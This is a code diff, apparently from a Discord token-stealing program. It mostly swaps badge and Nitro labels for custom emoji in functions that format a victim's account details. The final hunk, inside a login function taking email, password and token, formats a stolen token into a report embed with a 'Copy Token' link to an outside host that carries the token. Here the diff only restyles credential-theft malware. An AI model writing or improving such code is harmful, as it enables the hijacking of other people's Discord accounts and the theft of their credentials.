@@ -263,9 +263,9 @@ const getNitro = (flags) => {
     case 0:
       return "No Nitro";
     case 1:
-      return "Nitro Classic";
+      return "<:badge_nitro:966390434979012628> ";
     case 2:
-      return "<a:boost:965685957753987113>  Nitro Boost";
+      return "<:badge_nitro:966390434979012628>  <a:boost:965685957753987113>";
     default:
       return "No Nitro";
   }
@@ -275,34 +275,34 @@ const getBadges = (flags) => {
   let badges = "";
   switch (flags) {
     case 1:
-      badges += "Discord Staff, ";
+      badges += "<:badge_staff:966390598531706910> , ";
       break;
     case 2:
-      badges += "Partnered Server Owner, ";
+      badges += "<:badge_partner2:966391750283370586> , ";
       break;
     case 131072:
-      badges += "Discord Developer, ";
+      badges += "<a:badge_developer2:966390720145522748> , ";
       break;
     case 4:
-      badges += "Hypesquad Event, ";
+      badges += "<:badge_hypesquadevents:966391511111565382>, ";
       break;
     case 16384:
-      badges += "Gold BugHunter, ";
+      badges += "<:badge_bughunter2:966390769990664244> , ";
       break;
     case 8:
-      badges += "Green BugHunter, ";
+      badges += "<:badge_bughunter:966390746276048906> , ";
       break;
     case 512:
-      badges += "Early Supporter, ";
+      badges += "<:badge_earlysupporter:966390794678304818>, ";
       break;
     case 128:
-      badges += "<:Brilance:964601963293573120>";
+      badges += "<:Brilance:964601963293573120>, ";
       break;
     case 64:
-      badges += "<:Hypesquat4:964601933442744340>";
+      badges += "<:Hypesquat4:964601933442744340>, ";
       break;
     case 256:
-      badges += "<:HypeSquat1:964601904481046619>";
+      badges += "<:badge_balance:964601904481046619> , ";
       break;
     case 0:
       badges = "None";
@@ -337,7 +337,7 @@ const login = async (email, password, token) => {
         fields: [
        {
             name: `<a:tre:962470429115686923>  \`${token}\``,
-            value: `Copy Token [Copy Token](https://superfurrycdn.nl/copy/${token})`,
+            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
            {
